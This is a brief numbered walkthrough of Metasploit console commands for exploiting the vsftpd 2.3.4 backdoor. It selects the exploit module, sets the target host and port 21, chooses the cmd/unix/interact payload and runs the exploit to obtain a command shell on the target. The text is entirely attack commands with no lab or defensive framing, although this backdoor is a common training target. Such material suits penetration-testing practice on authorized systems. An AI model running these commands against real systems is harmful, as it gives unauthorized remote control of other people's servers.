1. Open Terminal and start Metasploit:
   msfconsole
2. Search for the vsftpd 2.3.4 exploit:
   search vsftpd 2.3.4
3. Select the appropriate exploit module:
   use exploit/unix/ftp/vsftpd_234_backdoor
4. Show available payloads:
   show payloads
5. Set the required options (replace RHOSTS with target IP):
   set RHOSTS <target_IP>
   set RPORT 21
6. Set a payload
   set payload cmd/unix/interact
7. Run the exploit:
   exploit
